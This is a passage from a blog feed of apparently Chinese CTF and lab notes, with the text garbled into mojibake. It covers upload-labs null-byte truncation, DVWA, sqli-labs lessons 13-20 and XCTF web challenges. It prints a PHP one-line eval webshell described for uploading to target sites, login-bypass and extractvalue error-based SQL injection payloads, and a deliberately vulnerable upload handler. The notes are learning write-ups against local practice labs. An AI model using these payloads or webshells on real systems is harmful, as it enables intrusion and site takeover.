alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Pass-19-00æˆªæ–­"><a href="#Pass-19-00æˆªæ–­" class="headerlink" title="Pass-19-00æˆªæ–­"></a>Pass-19-00æˆªæ–­</h2><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1234567891011121314151617181920212223242526</span></span><br></pre></td></tr></table></figure><p>å‘ç°move_uploaded_file()å‡½æ•°ä¸­çš„img_pathæ˜¯ç”±postå‚æ•°save_nameæ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥åœ¨save_nameåˆ©ç”¨00æˆªæ–­ç»•è¿‡ï¼Œæ–¹æ³•åŒpass-12</p><p><img src="https://img-blog.csdnimg.cn/2019061912220724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20190619122142117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20190619122230333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      
        <tags>
            
            <tag> upload-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpæ‹“å±•</title>
      <link href="/2021/02/19/php/php%E6%8B%93%E5%B1%95/"/>
      <url>/2021/02/19/php/php%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h4 id="ä¸€å¥è¯æœ¨é©¬"><a href="#ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬"></a>ä¸€å¥è¯æœ¨é©¬</h4><h5 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h5><p>æœ€ç®€å•çš„ä¸€å¥è¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php @eval($_POST[&#39;attack&#39;]); ?&gt;</span><br></pre></td></tr></table></figure><p>â€‹        åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¾€ç›®æ ‡ç½‘ç«™ä¸­ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åå°±å¯ä»¥åœ¨æœ¬åœ°é€šè¿‡èšå‰‘å³å¯è·å–å’Œæ§åˆ¶æ•´ä¸ªç½‘ç«™ç›®å½•ã€‚</p><p>â€‹        @è¡¨ç¤ºåé¢å³ä½¿æ‰§è¡Œé”™è¯¯ï¼Œä¹Ÿä¸æŠ¥é”™ã€‚<strong>evalï¼ˆï¼‰å‡½æ•°</strong>è¡¨ç¤ºæ‹¬å·å†…çš„è¯­å¥å­—ç¬¦ä¸²ä»€ä¹ˆ/.çš„å…¨éƒ½å½“åšä»£ç æ‰§è¡Œã€‚$_POST[â€˜attackâ€™]è¡¨ç¤ºä»é¡µé¢ä¸­è·å¾—attackè¿™ä¸ªå‚æ•°å€¼ã€‚ï¼ˆä¹Ÿå°±æ˜¯[â€˜     â€˜]é‡Œçš„æ•°å€¼å¯ä»¥æ”¹å˜ï¼Œä½œä¸ºå¯†ç ï¼‰</p><h5 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h5><p>â€‹                    ï¼ˆ1ï¼‰æœ¨é©¬ä¸Šä¼ æˆåŠŸï¼Œæœªè¢«æ€ï¼›<br>â€‹                    ï¼ˆ2ï¼‰çŸ¥é“æœ¨é©¬çš„è·¯å¾„åœ¨å“ªï¼›<br>â€‹                    ï¼ˆ3ï¼‰ä¸Šä¼ çš„æœ¨é©¬èƒ½æ­£å¸¸è¿è¡Œã€‚</p><h4 id="php-require-onceçš„ä½¿ç”¨æ–¹æ³•æ€»ç»“"><a href="#php-require-onceçš„ä½¿ç”¨æ–¹æ³•æ€»ç»“" class="headerlink" title="php require_onceçš„ä½¿ç”¨æ–¹æ³•æ€»ç»“"></a>php require_onceçš„ä½¿ç”¨æ–¹æ³•æ€»ç»“</h4><p><a href="https://www.php.cn/php-weizijiaocheng-370472.html">https://www.php.cn/php-weizijiaocheng-370472.html</a></p><p>â€‹        require_once è¯­å¥å’Œ require è¯­å¥å®Œå…¨ç›¸åŒï¼Œå”¯ä¸€åŒºåˆ«æ˜¯</p><p> require_once() è¯­å¥åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒ…æ‹¬å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚æ­¤è¡Œä¸ºå’Œ require() è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…æ‹¬äº†ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…æ‹¬ã€‚</p><p>ä¾‹å­ï¼š</p><p>æ¯”å¦‚ä½ å†™äº†ä¸€ä¸ªç±»æ–‡ä»¶a.phpï¼Œè¿™ä¸ªæ–‡ä»¶ä¸»è¦æ˜¯å®šä¹‰ç±»ï¼Œä»£ç å¯èƒ½å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">p</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">&#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> &#123;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">echo</span> $a;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"> &#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params">&#125;</span></span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ä½ åœ¨æ–‡ä»¶b.phpä¸­è¦ä½¿ç”¨åˆ°è¯¥ç±»ï¼Œå°±å¯ä»¥å†b.phpå¼€å¤´åŠ ä¸Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require_once(a.php);</span><br></pre></td></tr></table></figure><p>æ¥åŠ è½½è¿™ä¸ªa.phpï¼Œå°±ç›¸å½“äºæŠŠa.phpçš„æ–‡ä»¶çš„ä»£ç å¤åˆ¶åˆ°äº†b.phpä¸­ã€‚</p><p>ç±»ä¼¼çš„æ–¹æ³•è¿˜æœ‰requeire(),include(),include_once()å…¶ä¸­å¸¦_onceå­—æ ·çš„æ–¹æ³•éƒ½æ˜¯å£°æ˜åªåŠ è½½ä¸€æ¬¡ï¼Œå› ä¸ºä½ require_once()çš„åˆ«æ–‡ä»¶ä¸­å¯èƒ½å·²ç»require_once(a.php)äº†ï¼Œå¦‚æœå†åŠ è½½å°±é€ æˆé‡å¤åŠ è½½ï¼Œä»£ç é‡ä¼šå¢åŠ é€ æˆè§£æå‡æ…¢ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1-5</title>
      <link href="/2021/02/18/dvwa/1-5/"/>
      <url>/2021/02/18/dvwa/1-5/</url>
      
        <content type="html"><![CDATA[<p>æ¨èæ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/web/119467.html">https://www.freebuf.com/articles/web/119467.html</a></p><h4 id="brute-forceï¼š"><a href="#brute-forceï¼š" class="headerlink" title="brute forceï¼š"></a>brute forceï¼š</h4><p> 1.å¦‚é¢˜æš´åŠ›ç ´è§£ï¼Œé‡‡ç”¨burp suiteå­—å…¸è¿›è¡ŒçŒœæµ‹ç”¨æˆ·åå’Œå¯†ç </p><p> 2.ä½¿ç”¨â€œä¸‡èƒ½å¯†ç â€ï¼šadminâ€™ orâ€™1â€™=â€™1</p><h4 id="file-uploadï¼š"><a href="#file-uploadï¼š" class="headerlink" title="file uploadï¼š"></a>file uploadï¼š</h4><p>ï¼ˆè¿™é‡Œç›´æ¥å»åšä¸€åšuploadsé¶åœºä¼šæ›´æœ‰æ”¶è·ï¼‰</p><p>çœ‹ä»£ç å®‰å…¨ç¨‹åº¦ä½ï¼Œå¯¹äºä¸Šä¼ æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œ</p><p>æ‰€ä»¥ç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œphpæ–‡ä»¶è¿›è¡Œè¿æ¥ã€‚</p><p>file upload1ï¼š1.æŠ“åŒ…ï¼Œä¿®æ”¹æ•°æ®ï¼š1.jpgæ›´æ”¹ä¸º1.phpä¸Šä¼ ï¼ŒæˆåŠŸã€‚</p><p>../../hackable/uploads/1.php succesfully uploaded!</p><p>â€‹                2.é‡‡ç”¨%00æˆªæ–­çš„æ–¹æ³•å¯ä»¥è½»æ¾ç»•è¿‡æ–‡ä»¶åçš„æ£€æŸ¥</p><p>%00åœ¨urlè¯­è¨€é‡Œä»£è¡¨ç©ºæ ¼â€œ â€ï¼Œå› æ­¤å®ƒèµ·åˆ°çš„ä½œç”¨å°±æ˜¯æˆªæ–­æ–‡ä»¶çš„ååŠæ®µï¼Œè®©å®ƒè¯†åˆ«åˆ°çš„æ–‡ä»¶æ ¼å¼æ˜¯.jpgï¼Œè€Œè§£ææ—¶ä¼šæ˜¯å‰é¢çš„è„šæœ¬æ ¼å¼,æ¯”å¦‚æ”¹åŒ…æ—¶1.php.jpg</p><p>Sql:ä½¿ç”¨sqlmapè·‘çš„æ—¶å€™ï¼Œå› ä¸ºè‡ªå·±çš„å®‰è£…é—®é¢˜ï¼Œæ‰§è¡Œå‘½ä»¤å¿…é¡»ä»¥sqlmap.py -uçš„æ ¼å¼</p><h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p>æš‚æ—¶ä¸å¤ªç†è§£ï¼Œæ‰€ä»¥å¦å¤–å»æ‘˜æŠ„äº†å…¶ä»–åšä¸»å†…å®¹ä½œä¸ºæ–‡ç« ã€‚</p><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><p>å…¶å®å’Œä¹‹å‰åœ¨sqlé¶åœºå­¦ä¹ çš„å·®ä¸å¤šï¼Œæ€è·¯åŸºæœ¬ä¸Šæ˜¯ï¼š</p><p>çˆ†å­—â€“çˆ†æ®µâ€“æŠ¥è¡¨â€“çˆ†å†…å®¹</p><p>å¯¹äºéš¾åº¦çš„åŒºåˆ«çš„è¯ï¼Œæ— élowç­‰çº§å¯ä»¥ç›´æ¥è¾“å…¥å¥å­æŸ¥è¯¢ï¼Œè€Œmediumç­‰çº§ä¹‹åå®Œå…¨å¯ä»¥æŠ“åŒ…æ¥å®ç°è¯­å¥æŸ¥è¯¢ï¼ˆç¯¡æ”¹ï¼‰</p><p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(44).png"></p><p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(45).png"></p><p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(46).png"></p><p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(49).png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11-20</title>
      <link href="/2021/02/18/sql/11-20/"/>
      <url>/2021/02/18/sql/11-20/</url>
      
        <content type="html"><![CDATA[<h4 id="ç¬¬åä¸‰å…³ï¼š"><a href="#ç¬¬åä¸‰å…³ï¼š" class="headerlink" title="ç¬¬åä¸‰å…³ï¼š"></a>ç¬¬åä¸‰å…³ï¼š</h4><p>å¥‡æ€ªçš„æ˜¯ï¼Œæˆ‘çš„å›æ˜¾å’Œä½œè€…çš„ä¸ä¸€æ ·ï¼Œç›´æ¥adminâ€™)#å½“ç”¨æˆ·åä½œä¸‡èƒ½å¯†ç ã€‚</p><p>SELECT username, password FROM users WHERE username=(â€˜adminâ€™)#â€™) and password=(â€˜123â€™) LIMIT 0,1</p><p>ä½†æ˜¯#æ”¹æˆâ€“+å´ä¸è¡Œ</p><h4 id="ç¬¬åå››å…³ï¼šåŒå¼•å·"><a href="#ç¬¬åå››å…³ï¼šåŒå¼•å·" class="headerlink" title="ç¬¬åå››å…³ï¼šåŒå¼•å·"></a>ç¬¬åå››å…³ï¼šåŒå¼•å·</h4><p>SELECT username, password FROM users WHERE username=â€adminâ€#â€ and password=â€123â€ LIMIT 0,1</p><p>æ¥è‡ª <a href="http://127.0.0.1/sqllib/Less-14/">http://127.0.0.1/sqllib/Less-14/</a> </p><h4 id="ç¬¬åäº”å…³"><a href="#ç¬¬åäº”å…³" class="headerlink" title="ç¬¬åäº”å…³:"></a>ç¬¬åäº”å…³:</h4><p>SELECT username, password FROM users WHERE username=â€™adminâ€™#â€™ and password=â€™123â€™ LIMIT 0,1</p><p>æ¥è‡ª <a href="http://127.0.0.1/sqllib/Less-15/">http://127.0.0.1/sqllib/Less-15/</a> </p><h4 id="ç¬¬åå…­å…³ï¼š"><a href="#ç¬¬åå…­å…³ï¼š" class="headerlink" title="ç¬¬åå…­å…³ï¼š"></a>ç¬¬åå…­å…³ï¼š</h4><p>SELECT username, password FROM users WHERE username=(â€œadminâ€)#â€) and password=(â€œ123â€) LIMIT 0,1</p><p>æ¥è‡ª <a href="http://127.0.0.1/sqllib/Less-16/">http://127.0.0.1/sqllib/Less-16/</a> </p><h4 id="ç¬¬åä¸ƒå…³ï¼š"><a href="#ç¬¬åä¸ƒå…³ï¼š" class="headerlink" title="ç¬¬åä¸ƒå…³ï¼š"></a>ç¬¬åä¸ƒå…³ï¼š</h4><p>SELECT username, password FROM users WHERE username= â€˜adminâ€™ LIMIT 0,1</p><p>XPATH syntax error: â€˜<del>8.0.12</del>â€˜</p><p>æ¥è‡ª <a href="http://127.0.0.1/sqllib/Less-17/">http://127.0.0.1/sqllib/Less-17/</a> </p><h4 id="ç¬¬åå…«å…³ï¼š"><a href="#ç¬¬åå…«å…³ï¼š" class="headerlink" title="ç¬¬åå…«å…³ï¼š"></a>ç¬¬åå…«å…³ï¼š</h4><p>Your IP ADDRESS is: 127.0.0.1</p><p>SELECT users.username, users.password FROM users WHERE users.username=â€™adminâ€™ and users.password=1 ORDER BY users.id DESC LIMIT 0,1Your User Agent is: â€˜and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and â€˜1â€™=â€™1</p><p>XPATH syntax error: â€˜<del>8.0.12</del>â€˜</p><p>æ¥è‡ª <a href="http://127.0.0.1/sqllib/Less-18/">http://127.0.0.1/sqllib/Less-18/</a> </p><h4 id="ç¬¬äºŒåå…³ï¼š"><a href="#ç¬¬äºŒåå…³ï¼š" class="headerlink" title="ç¬¬äºŒåå…³ï¼š"></a>ç¬¬äºŒåå…³ï¼š</h4><p><strong>Issue with your mysql: XPATH syntax error: â€˜~D:\phpstudy_pro\Extensions\MySQâ€™</strong></p><p>YOUR COOKIE : uname = admin1â€™and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# and expires: Tue 16 Feb 2021 - 13:36:07<br>Issue with your mysql: XPATH syntax error: â€˜~D:\phpstudy_pro\Extensions\MySQâ€™</p><p>æ¥è‡ª <a href="http://127.0.0.1/sqllib/Less-20/index.php">http://127.0.0.1/sqllib/Less-20/index.php</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿›é˜¶åŒº</title>
      <link href="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/"/>
      <url>/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="Baby-web"><a href="#Baby-web" class="headerlink" title="Baby_web"></a>Baby_web</h4><p>è®¿é—®index.php,è·³è½¬åå›åˆ°é¡µé¢ï¼Œè€ƒè™‘ä½¿ç”¨æŠ“åŒ…ï¼Œè¿›è¡Œrepeaterï¼Œgoååœ¨å¤´éƒ¨çœ‹åˆ° flagã€‚</p><p>æˆ–è€…ç›´æ¥æŸ¥çœ‹</p><p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(93).png"></p><h4 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h4><p>è€å¥—è·¯</p><p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(94).png"></p><p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(95).png"></p><h4 id="Php-rce"><a href="#Php-rce" class="headerlink" title="Php_rce"></a>Php_rce</h4><p>ç¥å¥‡çš„PHPv5æ¡†æ¶å­˜åœ¨æ¼æ´åˆ©ç”¨ï¼Œé‡‡ç”¨è·¯å¾„æ›´æ”¹ï¼ˆåƒLinuxæŒ‡ä»¤ï¼‰è¿›è¡Œè®¿é—®</p><p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(96).png"></p><p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(97).png"></p><p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(98).png"></p><p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(99).png"></p><p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(100).png"></p><p><a href="https://www.wrpzkb.cn/rce/#post-comment">https://www.wrpzkb.cn/rce/#post-comment</a></p><p><a href="https://www.cnblogs.com/sallyzhang/p/12408774.html">https://www.cnblogs.com/sallyzhang/p/12408774.html</a></p><h4 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h4><p>æ–‡ä»¶åŒ…å«æ¼æ´</p><p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(101).png"></p><p><a href="https://blog.csdn.net/nicesa/article/details/106325437">https://blog.csdn.net/nicesa/article/details/106325437</a></p><h4 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h4><h4 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h4><h4 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h4><p>è¿™æ˜¯2018å¼ºç½‘æ¯çš„é¢˜ç›®</p><p>æ‰“å¼€æ˜¯å¤§å¤§çš„æ»‘ç¨½</p><p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/5bdb0d93dc794.jpg"></p><p>æŸ¥çœ‹ä¸‹é¡µé¢æºç ï¼Œå‘ç°å¾ˆå¤šå‡½æ•°</p><p><img src="/2021/02/05/web/%E8%BF%9B%E9%98%B6%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(119).png"></p><p>è§‚å¯Ÿæºç å‘ç°hint.phpï¼Œæ‰“å¼€å‘ç°flag not here, and flag in ffffllllaaaaggggï¼Œè§‚å¯Ÿåˆ°å¦‚æœæ»¡è¶³ç›¸åº”çš„æ¡ä»¶ï¼Œæœ€åæ˜¯includeå¼•å…¥æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™ä¸ªä¿¡æ¯å¾ˆæœ‰ç”¨ã€‚æˆ‘ä»¬åªéœ€ä½¿emmm::checkFile($_REQUEST[â€˜fileâ€™]è¿”å›å€¼ä¸ºtrueï¼Œåˆ©ç”¨â€¦/è·³è½¬ç›®å½•è¯»å–flagå³å¯</p><p>è§‚å¯ŸcheckFileå‡½æ•°ï¼Œå‡ ä¸ªifè¯­å¥å¹¶åˆ—ï¼Œåªè¦æˆ‘ä»¬æ»¡è¶³å…¶ä¸­ä¸€ä¸ªtrue,å³æœ‰è¿”å›å€¼ï¼Œä¾¿ä¸éœ€è¦å¾€ä¸‹ç»§ç»­æ‰§è¡Œäº†</p><p>ç¬¬ä¸€ä¸ªæˆªå–çš„ä»£ç å°±æ˜¯å…³é”®ç‚¹ï¼Œä»£ç è¦æ±‚è¾“å…¥çš„å¿…é¡»æ‹¥æœ‰ç™½åå•ä¸­çš„å†…å®¹ï¼Œæˆ‘ä»¬ç›´æ¥å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡æˆªå–æ—¶åŒ¹é…åˆ°ç™½åå•çš„å†…å®¹ï¼Œæ¥ä¸‹æ¥ä¸€åŒ¹é…å³å¯è¿”å›true</p><p>ç¬¬ä¸€ä¸ªæˆªå–çš„ä»£ç å°±æ˜¯å…³é”®ç‚¹ï¼Œä»£ç è¦æ±‚è¾“å…¥çš„å¿…é¡»æ‹¥æœ‰ç™½åå•ä¸­çš„å†…å®¹ï¼Œæˆ‘ä»¬ç›´æ¥å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡æˆªå–æ—¶åŒ¹é…åˆ°ç™½åå•çš„å†…å®¹ï¼Œæ¥ä¸‹æ¥ä¸€åŒ¹é…å³å¯è¿”å›true</p><h4 id="NeswCentè¿™å—ç›¸å½“äºCè¯­è¨€é‡Œé¢çš„mainå‡½æ•°ï¼Œä¸Šé¢éƒ¨åˆ†çš„å†…å®¹ç›¸å½“äºå®šä¹‰äº†ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¸ªå‡½æ•°åœ¨mainå‡½æ•°é‡Œé¢è¢«è°ƒç”¨ï¼Œå…ˆçœ‹çœ‹mainå‡½æ•°é•¿å•¥æ ·ã€‚é¦–å…ˆä¸Šä¼ ä¸€ä¸ªfileï¼Œfileå¿…é¡»æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶æ‰èƒ½ç»§ç»­æ‰§è¡Œä¸‹å»ï¼š"><a href="#NeswCentè¿™å—ç›¸å½“äºCè¯­è¨€é‡Œé¢çš„mainå‡½æ•°ï¼Œä¸Šé¢éƒ¨åˆ†çš„å†…å®¹ç›¸å½“äºå®šä¹‰äº†ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¸ªå‡½æ•°åœ¨mainå‡½æ•°é‡Œé¢è¢«è°ƒç”¨ï¼Œå…ˆçœ‹çœ‹mainå‡½æ•°é•¿å•¥æ ·ã€‚é¦–å…ˆä¸Šä¼ ä¸€ä¸ªfileï¼Œfileå¿…é¡»æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶æ‰èƒ½ç»§ç»­æ‰§è¡Œä¸‹å»ï¼š" class="headerlink" title="NeswCentè¿™å—ç›¸å½“äºCè¯­è¨€é‡Œé¢çš„mainå‡½æ•°ï¼Œä¸Šé¢éƒ¨åˆ†çš„å†…å®¹ç›¸å½“äºå®šä¹‰äº†ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¸ªå‡½æ•°åœ¨mainå‡½æ•°é‡Œé¢è¢«è°ƒç”¨ï¼Œå…ˆçœ‹çœ‹mainå‡½æ•°é•¿å•¥æ ·ã€‚é¦–å…ˆä¸Šä¼ ä¸€ä¸ªfileï¼Œfileå¿…é¡»æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶æ‰èƒ½ç»§ç»­æ‰§è¡Œä¸‹å»ï¼š"></a>NeswCentè¿™å—ç›¸å½“äºCè¯­è¨€é‡Œé¢çš„mainå‡½æ•°ï¼Œä¸Šé¢éƒ¨åˆ†çš„å†…å®¹ç›¸å½“äºå®šä¹‰äº†ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¸ªå‡½æ•°åœ¨mainå‡½æ•°é‡Œé¢è¢«è°ƒç”¨ï¼Œå…ˆçœ‹çœ‹mainå‡½æ•°é•¿å•¥æ ·ã€‚é¦–å…ˆä¸Šä¼ 